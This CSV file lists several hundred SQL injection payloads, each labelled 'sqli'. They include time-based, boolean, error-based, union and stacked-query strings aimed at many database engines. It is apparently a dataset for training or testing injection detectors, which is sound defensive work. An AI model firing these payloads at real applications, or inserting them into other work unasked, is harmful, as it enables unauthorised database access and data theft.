"pattern","type"
"1'||(select 'jscc' from dual where 3266=3266 and elt(4249=4249,7259))||'","sqli"
"1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi","sqli"
"1%'))) and 9198=9198--","sqli"
"1%"" waitfor delay '0:0:5'--","sqli"
"1""))) and (3020=3020)*6703 and (((""krxy""=""krxy","sqli"
"1%""));select case when 7717=7717 then 1 else null end--","sqli"
"1""))) union all select null,null,null,null,null,null--","sqli"
"-7720)) or 2724 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (2724=2724) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ((8254=8254","sqli"
"1' in boolean mode) union all select null,null,null,null,null,null,null,null#","sqli"
"-3632' or make_set(9354=9354,7185) and 'lgpy' like 'lgpy","sqli"
"-7435') where 6242=6242 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","sqli"
"1%"") and 7533=7533 and (""%""=""","sqli"
"1"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1' where 8950=8950 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ican' like 'ican","sqli"
"1 where 4985=4985 order by 1#","sqli"
"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('nlky' like 'nlky","sqli"
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('jueq'='jueq","sqli"
"-8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","sqli"
"1%"" union all select null,null,null,null,null,null#","sqli"
"1"")) or 4240=(select 4240 from pg_sleep(5))--","sqli"
"-6014')) or (9860=4848)*4848 and (('qtge'='qtge","sqli"
"1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","sqli"
"-6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723","sqli"
"-8860) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)","sqli"
"-2359' union all select 2687,2687,2687#","sqli"
"1') as mqxb where 6496=6496 and 7533=7533--","sqli"
"-6039%')) or 6872=6872 and (('%'='","sqli"
"1' (select eluw where 6210=6210;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#","sqli"
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","sqli"
"1'||(select 'ogyu' from dual where 6691=6691;select (case when (8820=4648) then 8820 else 8820*(select 8820 from information_schema.character_sets) end)#","sqli"
"1;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","sqli"
"-9574') as rxym where 4719=4719 union all select 4719,4719,4719,4719,4719,4719,4719--","sqli"
"1,(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))","sqli"
"-9160') union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#","sqli"
"-7412"") as qngt where 2041=2041 union all select 2041--","sqli"
"1 where 6100=6100 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1%') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1%')));select benchmark(5000000,md5(0x4c4d6142)) and ((('%'='","sqli"
"1"") and sleep(5) and (""ytof""=""ytof","sqli"
"1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('gwew' like 'gwew","sqli"
"1"" where 5236=5236 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","sqli"
"1',(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))","sqli"
"1') and 2577=7094","sqli"
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#","sqli"
"1')) as dqdv where 8126=8126 and 4595=4595#","sqli"
"1"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1'||(select 'uyfo' where 1236=1236 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'","sqli"
"1%"")));if(7899=7899) select 7899 else drop function zbbp--","sqli"
"1"") as bllz where 6975=6975 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"-3895') or 8645=5359--","sqli"
"1%""))) or sleep(5) and (((""%""=""","sqli"
"1"") where 4878=4878 and (select * from (select(sleep(5)))fzno)--","sqli"
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""jcgh""=""jcgh","sqli"
"-3125'))) order by 1#","sqli"
"1)) as zykv where 2158=2158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","sqli"
"-7860'))) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--","sqli"
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('xiyl' like 'xiyl","sqli"
"1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#","sqli"
"-4205') or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))","sqli"
"1' where 6003=6003 rlike (select (case when (7689=7689) then 1 else 0x28 end))--","sqli"
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--","sqli"
"-9958"") as jzvq where 3741=3741 union all select 3741,3741,3741#","sqli"
"1')) and (select * from (select(sleep(5)))fzno) and (('wevl'='wevl","sqli"
"-4256') where 9545=9545 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","sqli"
"1' where 8482=8482 or sleep(5)#","sqli"
"1"") as ypfa where 6128=6128;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","sqli"
"1') union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh","sqli"
"1'||(select 'nbmo' from dual where 5572=5572 and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('akyc'='akyc","sqli"
"-9555'))) or (8459=8459)*4906 and ((('rwpq' like 'rwpq","sqli"
"1) where 3915=3915 union all select null,null,null,null#","sqli"
"1) union all select null,null,null,null,null,null,null,null--","sqli"
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('zpzf'='zpzf","sqli"
"1%'))) and (select * from (select(sleep(5)))fzno) and ((('%'='","sqli"
"1 where 8273=8273 union all select null,null,null,null,null,null,null,null#","sqli"
"1' (select ahyw where 6893=6893 waitfor delay '0:0:5'--","sqli"
"1' or sleep(5) and 'yudo'='yudo","sqli"
"1' (select 'uetb' where 6468=6468;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"-8477' union all select 2517,2517,2517--","sqli"
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""qqfd"" like ""qqfd","sqli"
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)","sqli"
"1%' and (select * from (select(sleep(5)))fzno) and '%'='","sqli"
"1%';iif(6369=5881,1,1/0)","sqli"
"1%'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')","sqli"
"1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('ineq' like 'ineq","sqli"
"1%"";select case when 7717=7717 then 1 else null end--","sqli"
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'wwwb'='wwwb","sqli"
"1'));select benchmark(5000000,md5(0x714e4153))#","sqli"
"1'))) order by 1#","sqli"
"-2054%""))) or 2724 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (2724=2724) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and (((""%""=""","sqli"
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='","sqli"
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('swjk'='swjk","sqli"
"1'))) union all select null,null,null,null#","sqli"
"1%""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1%"") and 2388=benchmark(5000000,md5(0x6d457153))#","sqli"
"1%"");select case when 7717=7717 then 1 else null end--","sqli"
"1'||(select 'mwmn' where 5112=5112 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'","sqli"
"1"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"1%') union all select null,null,null,null,null,null,null#","sqli"
"1"" where 1537=1537 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","sqli"
"1"") as wvxt where 7321=7321 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","sqli"
"1""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1"") and sleep(5)#","sqli"
"1"") and elt(4249=4249,7259) and (""xgka"" like ""xgka","sqli"
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","sqli"
"1'))) and (3020=3020)*6703 and ((('qfxg'='qfxg","sqli"
"1' union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"-5062""))) union all select 4125,4125--","sqli"
"1)) as oqui where 3368=3368 order by 1--","sqli"
"1'))) waitfor delay '0:0:5'--","sqli"
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'ccsb'='ccsb","sqli"
"1'));select count(*) from generate_series(1,5000000) and (('jloi'='jloi","sqli"
"1"") union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('squj'='squj","sqli"
"1%"")) rlike sleep(5) and ((""%""=""","sqli"
"-8665' or 6825=7840 and 'vbsy' like 'vbsy","sqli"
"1%'));(select * from (select(sleep(5)))acdk)#","sqli"
"1') and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1';select pg_sleep(5)--","sqli"
"1"") where 2445=2445;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","sqli"
"1"") where 4905=4905 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"-9742) where 8409=8409 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--","sqli"
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#","sqli"
"1'||(select 'pvmz' from dual where 1090=1090 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))||'","sqli"
"-2100' where 9260=9260 or 3038=3038","sqli"
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'egye'='egye","sqli"
"1%')));select * from generate_series(5206,5206,case when (5206=2214) then 1 else 0 end) limit 1--","sqli"
"1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||'","sqli"
"-4523 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","sqli"
"1%' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='","sqli"
"1"" where 8234=8234;select (case when (4291=6937) then 4291 else 4291*(select 4291 from mysql.db) end)#","sqli"
"1' (select 'ncny' where 5634=5634;select like('abcdefg',upper(hex(randomblob(500000000/2))))) '","sqli"
"1' where 8837=8837 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv","sqli"
"1' (select aqhj where 4419=4419;waitfor delay '0:0:5'--","sqli"
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""ctdc""=""ctdc","sqli"
"-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","sqli"
"1') where 8125=8125 and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))--","sqli"
"1"");select (case when (4415=2051) then 4415 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1"") as qjyu where 2679=2679 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1' (select 'utlx' where 6256=6256 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))) '","sqli"
"-2745') or elt(1032=1032,3623) and ('vfxq'='vfxq","sqli"
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)# cqqs","sqli"
"1')) as qpai where 2619=2619;(select * from (select(sleep(5)))acdk)#","sqli"
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""ulfr"" like ""ulfr","sqli"
"1' (select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)) '","sqli"
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('xmwj'='xmwj","sqli"
"1%"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""","sqli"
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"-9133"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""crfy""=""crfy","sqli"
"1"";iif(2084=5671,1,1/0)","sqli"
"1';begin dbms_lock.sleep(5); end and 'aenf'='aenf","sqli"
"-8629 where 8049=8049 union all select 8049,8049,8049,8049,8049,8049,8049#","sqli"
"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","sqli"
"elt(8192=8192,sleep(5))","sqli"
"1%';select case when 7717=7717 then 1 else null end--","sqli"
"1 where 3799=3799 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"-2951"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))","sqli"
"make_set(8734=8734,sleep(5))","sqli"
"-8566"") as hnch where 3418=3418 union all select 3418,3418,3418,3418,3418,3418,3418#","sqli"
"1))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1""))) union all select null,null,null,null,null,null,null#","sqli"
"-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--","sqli"
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('dfsj'='dfsj","sqli"
"1"")));select benchmark(5000000,md5(0x714e4153))#","sqli"
"1"" where 8697=8697 and elt(3114=3114,sleep(5))#","sqli"
"1"");select (case when (6839=2730) then 6839 else 6839*(select 6839 from mysql.db) end)#","sqli"
"1"" where 3247=3247 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"-4562') or 3038=3038","sqli"
"1) rlike sleep(5) and (5724=5724","sqli"
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj","sqli"
"1') as omtb where 1183=1183 and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"1 where 2649=2649 or (select * from (select(sleep(5)))ydpu)--","sqli"
"1%""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""","sqli"
"1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","sqli"
"1 union all select null,null,null,null,null,null#","sqli"
"1,(select * from generate_series(9108,9108,case when (9108=2900) then 1 else 0 end) limit 1)","sqli"
"1"";begin dbms_lock.sleep(5); end--","sqli"
"1%"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""","sqli"
"1"") where 6632=6632 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","sqli"
"1') as xagu where 9088=9088 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","sqli"
"1"") as dlfq where 8410=8410;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","sqli"
"1')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"-9408%"")) union all select 1841,1841,1841,1841,1841,1841--","sqli"
"-1134"" union all select 4865,4865,4865,4865,4865#","sqli"
"1%"") and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"-4373' (select 'rlht' where 2285=2285 union all select 2285,2285,2285#","sqli"
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('ckfn' like 'ckfn","sqli"
"1') as lewd where 3118=3118 order by 1--","sqli"
"-7808"")) as jgkk where 9230=9230 or elt(1032=1032,3623)--","sqli"
"1')) as bbdf where 1327=1327;iif(8354=3515,1,1/0)","sqli"
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)-- kfqs","sqli"
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--","sqli"
"-7514%""))) or 2448=8797#","sqli"
"1 or (select * from (select(sleep(5)))ydpu)-- paxv","sqli"
"1' where 9222=9222 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1) where 1120=1120;select (case when (3716=4021) then 3716 else 3716*(select 3716 from information_schema.character_sets) end)#","sqli"
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""urgd""=""urgd","sqli"
"1%' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and '%'='","sqli"
"1)) as ambt where 5198=5198 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--","sqli"
"1"";waitfor delay '0:0:5'","sqli"
"1' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"1' where 1230=1230 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#","sqli"
"1' (select gqez where 3704=3704;select (case when (9030=6952) then 1 else 9030*(select 9030 from master..sysdatabases) end)--","sqli"
"-3733')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('ybgd'='ybgd","sqli"
"1';begin user_lock.sleep(5); end and 'blit'='blit","sqli"
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))# fmxq","sqli"
"1'||(select 'qwoo' from dual where 8802=8802 or elt(6272=6272,sleep(5)))||'","sqli"
"(select (case when (1570=6977) then 1 else 1570*(select 1570 from mysql.db) end))","sqli"
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","sqli"
"1%'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='","sqli"
"1"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1')) as usrk where 6324=6324 union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"1'||(select 'etvo' from dual where 1557=1557;(select * from (select(sleep(5)))acdk)#","sqli"
"1'||(select 'flre' where 8250=8250 or 8421=(select count(*) from generate_series(1,5000000)))||'","sqli"
"-5903%""))) or 3038=3038","sqli"
"1') or 8514=benchmark(5000000,md5(0x544d5a4c))#","sqli"
"1%"" union all select null,null,null,null,null,null,null,null--","sqli"
"-6722') order by 1#","sqli"
"1"")));select (case when (4774=1535) then 4774 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1' in boolean mode);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","sqli"
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--","sqli"
"1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('ltki'='ltki","sqli"
"1"" union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1"")) as oiqr where 4073=4073 or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"1%"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""","sqli"
"1"" where 4064=4064 and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))--","sqli"
"-4373%"")) or 5672=5188--","sqli"
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'ebuo'='ebuo","sqli"
"-6073""))) or 9502=2012#","sqli"
"1"")));begin dbms_lock.sleep(5); end and (((""zpii"" like ""zpii","sqli"
"1"") where 9861=9861;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","sqli"
"1' (select 'otqy' where 2754=2754 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)) '","sqli"
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","sqli"
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('wnzv'='wnzv","sqli"
"-7775 or 8571=8571--","sqli"
"1 and 6969=(select 6969 from pg_sleep(5))# pkcp","sqli"
"1'||(select 'cgup' from dual where 5383=5383 waitfor delay '0:0:5'--","sqli"
"1) and elt(3138=1817,1817)","sqli"
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'hhrw' like 'hhrw","sqli"
"1' and sleep(5) and 'usgv' like 'usgv","sqli"
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1)));select (case when (3336=9781) then 3336 else 1/(select 0) end)--","sqli"
"-5967 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# lhoh","sqli"
"1"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"-3209' (select ldum where 9912=9912 union all select 9912,9912,9912,9912#","sqli"
"1""));select sleep(5)#","sqli"
"-3582') or 6872=6872 and ('gyfj'='gyfj","sqli"
"(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual)","sqli"
"1)) as potk where 5040=5040 or elt(5873=5873,sleep(5))#","sqli"
"1""))) and (select * from (select(sleep(5)))fzno) and (((""uncg""=""uncg","sqli"
